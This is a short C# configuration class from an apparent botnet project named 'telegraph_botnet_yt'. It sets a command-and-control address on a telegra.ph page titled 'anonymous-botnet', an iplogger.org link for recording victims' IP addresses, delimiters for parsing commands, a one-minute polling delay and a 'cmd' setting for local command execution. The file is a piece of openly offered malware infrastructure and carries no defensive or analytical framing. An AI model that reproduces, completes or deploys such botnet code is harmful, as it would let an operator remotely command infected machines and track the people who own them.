namespace telegraph_botnet_yt
{
    class configs
    {
        public static string server { get; set; } = "https://telegra.ph/anonymous-botnet-05-19";

        public static string ipLogger { get; set; } = "https://iplogger.org/2WSjh5";

        public static string spliter { get; set; } = "{split}";

        public static string spliter2 { get; set; } = "{split2}";

        public static int delay { get; set; } = 60000; // 1 мин
        
        public static string telegraph_auth_token { get; set; } = "auth_token";

        public static string local_cmd { get; set; } = "cmd";
    }
}
